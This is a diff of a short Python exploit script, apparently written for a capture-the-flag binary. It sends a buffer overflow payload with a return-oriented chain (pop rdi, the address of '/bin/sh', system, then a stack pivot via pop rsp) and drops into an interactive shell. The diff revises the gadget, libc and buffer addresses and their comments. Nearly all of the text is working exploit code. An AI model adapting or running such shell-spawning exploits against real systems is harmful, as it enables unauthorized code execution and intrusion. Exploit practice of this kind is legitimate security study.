@@ -12,13 +12,20 @@ def u64(s):
 p = interact.Process()
 print(p.readuntil('chain:'))
 
-ropchain = p64(0x00000000004007e3)+p64(0x7f00003b4d57)+p64(0x7f000026d390)
-payload = "B"*24+ropchain+"A"*24+p64(0x00000000004007dd)+p64(0x7fffffffed30)
+libc_base = 0x7f0000228000
+pop_rdi = p64(0x4007e3)
+pop_rsp = p64(libc_base+0x3838)
+sh = p64(0x7f00003b4d57)
+system = p64(0x7f000026d390)
+buffer_start = p64(0x7fffffffed70) # rbp-0x40
+
+payload = pop_rdi + sh + system + "A"*48 + pop_rsp + buffer_start
+
 p.sendline(payload)
 p.interactive() 
 
 # system = 0x7f000026d390
 # /bin/sh at 0x7f00003b4d57
 # 0x00000000004007e3 : pop rdi ; ret
-# 0x00000000004007dd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
-# buffer starts at 0x7fffffffed30 i.e. rbp-0x40
+# 0x0000000000003838 : pop rsp ; ret
+# buffer starts at 0x7fffffffed70 i.e. rbp-0x40
